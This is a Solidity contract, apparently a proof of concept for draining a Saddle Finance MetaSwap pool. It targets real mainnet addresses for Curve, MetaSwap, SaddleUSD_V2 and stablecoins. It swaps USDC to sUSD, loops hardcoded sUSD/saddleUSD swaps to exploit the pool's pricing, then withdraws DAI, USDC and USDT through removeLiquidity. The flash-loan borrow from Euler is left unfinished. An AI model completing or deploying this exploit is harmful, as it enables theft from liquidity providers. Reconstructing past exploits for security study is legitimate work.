//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./console.sol";
import "./IERC20.sol";
// import "./IEuler.sol";
import "./ICurve.sol";
import "./IMetaSwap.sol";
import "./ISwap.sol";


contract falshloan {
    // address public constant Aave_monitor = 0xBaC78d552A79aa10863c4ec1b0FF9efFA41f6Fac;
    address public constant Euler_protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address public constant Exec_address = 0x155020C32cEb5E1BFdD6217c2E7906c92bcAC8c1;
    address public constant MetaSwap = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;
    
    address public constant curve_SUSD_Pair = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;       //DAI-USDC-USDT-sUSD(0,1,2,3)
    address public constant DAI_USDC_USDT_flashloan = 0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7;
    address public constant USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    address public constant SaddleUSD_V2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;
    address public constant sUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    address public constant UNIV3_SwapRouter02 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address public constant UNI_V2_router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;         //swap



    function set_all_approve() public{
        IERC20(USDC).approve(UNIV3_SwapRouter02, type(uint).max);

        IERC20(USDC).approve(curve_SUSD_Pair, type(uint).max);
        IERC20(sUSD).approve(curve_SUSD_Pair, type(uint).max);
        IUSDT(USDT).approve(curve_SUSD_Pair, type(uint).max);
        IERC20(DAI).approve(curve_SUSD_Pair, type(uint).max);

        IERC20(SaddleUSD_V2).approve(MetaSwap, type(uint).max);
        IERC20(sUSD).approve(MetaSwap, type(uint).max);
        console.log("all the tokens are approved...");
    }

    function borrow_USDC_from_Euler() public{
        // IEuler(Euler_protocol).dispatch();               //????how to borrow from Euler
        console.log("I have USDC : ", IERC20(USDC).balanceOf(address(this)));
        // swap_sUSD_from_curve();
    }

    function swap_sUSD_from_curve() public{
        uint256 amount_USDC = IERC20(USDC).balanceOf(address(this));
        // uint256 need_usdc = ICurve_Pair(curve_SUSD_Pair).get_dy(3, 1, 14800272147571999524518901);
        // console.log("need USDC tokens", need_usdc);
        uint256 remain_usdc = ICurve_Pair(curve_SUSD_Pair).balances(1);
        uint256 remain_susd = ICurve_Pair(curve_SUSD_Pair).balances(3);
        console.log("remaining USDC , SUSD: ", remain_usdc, remain_susd);

        ICurve_Pair(curve_SUSD_Pair).exchange(1, 3, amount_USDC, 1);
        console.log("I got sUSD from curve: ", IERC20(sUSD).balanceOf(address(this)));
        swap_for_many_times();
    }

    function swap_sUSD_to_saddlUSD_from_MetaSwap(uint256 sUSD_amountIn) internal {
        // uint256 sUSD_amountIn = 14800272147571999524518901;
        IMetaSwap(MetaSwap).swap(0, 1, sUSD_amountIn, 0, block.timestamp);
        // console.log("I got saddle_USD_amount from MetaSwap: ", IERC20(SaddleUSD_V2).balanceOf(address(this)), saddle_USD_amountOut);
    }

    function swap_saddlUSD_to_sUSD_from_MetaSwap(uint256 saddle_USD_amountIn) internal {
        // uint256 saddle_USD_amountIn = IERC20(SaddleUSD_V2).balanceOf(address(this));
        IMetaSwap(MetaSwap).swap(1, 0, saddle_USD_amountIn, 0, block.timestamp);
        // console.log("I got sUSD_amountOut from MetaSwap: ", IERC20(sUSD).balanceOf(address(this)), sUSD_amountOut);
    }

    function swap_for_many_times() internal {
        console.log("swap swap swap ......");
        swap_sUSD_to_saddlUSD_from_MetaSwap(14800272147571999524518901);
        swap_saddlUSD_to_sUSD_from_MetaSwap(IERC20(SaddleUSD_V2).balanceOf(address(this)));
        swap_sUSD_to_saddlUSD_from_MetaSwap(14800272147571999524518901);
        swap_saddlUSD_to_sUSD_from_MetaSwap(IERC20(SaddleUSD_V2).balanceOf(address(this)));
        swap_sUSD_to_saddlUSD_from_MetaSwap(5000000000000000000000000);
        swap_sUSD_to_saddlUSD_from_MetaSwap(10000000000000000000000000);
        swap_saddlUSD_to_sUSD_from_MetaSwap(4654333077089603189182019);
        swap_sUSD_to_saddlUSD_from_MetaSwap(10000000000000000000000000);
        swap_saddlUSD_to_sUSD_from_MetaSwap(4661615013534255756105730);
        console.log("Now I have sUSD: ", IERC20(sUSD).balanceOf(address(this)));
        console.log("Now I have SaddleUSD_V2: ", IERC20(SaddleUSD_V2).balanceOf(address(this)));
        
        remove_from_Curve();
    }

    function remove_from_Curve() internal{
        // uint256 DAI_amount = 1810723.455638732389504479 * 10**18;
        // uint256 USDC_amount = 1691981.791323 * 10**6;
        // uint256 USDT_amount = 1530488.975938 * 10**6;
        uint256[] memory _minAmounts = new uint256[](3);
        _minAmounts[0] = 0;
        _minAmounts[1] = 0;
        _minAmounts[2] = 0;

        IERC20(SaddleUSD_V2).approve(DAI_USDC_USDT_flashloan, type(uint).max);
        ISwap(DAI_USDC_USDT_flashloan).removeLiquidity(IERC20(SaddleUSD_V2).balanceOf(address(this)), _minAmounts, block.timestamp);
        console.log("I have DAI: ", IERC20(DAI).balanceOf(address(this)));
        console.log("I have USDC: ", IERC20(USDC).balanceOf(address(this)));
        console.log("I have USDT: ", IERC20(USDT).balanceOf(address(this)));

    }

}
